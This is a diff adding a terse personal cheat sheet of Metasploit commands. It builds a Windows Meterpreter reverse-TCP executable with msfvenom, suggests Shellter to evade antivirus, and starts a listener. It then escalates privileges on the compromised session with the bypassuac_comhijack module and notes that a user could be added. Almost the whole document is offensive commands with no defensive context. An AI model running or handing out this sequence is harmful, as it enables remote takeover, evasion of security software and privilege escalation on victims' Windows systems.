@@ -1,0 +1,50 @@
+---From Original Resource---
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=192.168.***.*** LPORT=4444 -o /root/setPayloads/[nameHere].exe
+
+
+#side note, use Shellter on above thing maybe for stupid
+
+
+
+---Inside Msfconsole---
+
+
+
+use multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+
+#then set LHOST & LPORT 
+
+run
+#runs payload listener
+
+
+##Wait for executable to run
+
+
+
+background 
+
+
+
+use windows/local/bypassuac_comhijack
+
+
+
+set SESSION # 
+
+#The '#' sign is for the correct session number
+
+
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+#set LHOST & LPORT
+
+
+
+run
+#could add a user, would have to drop into a W10 shell
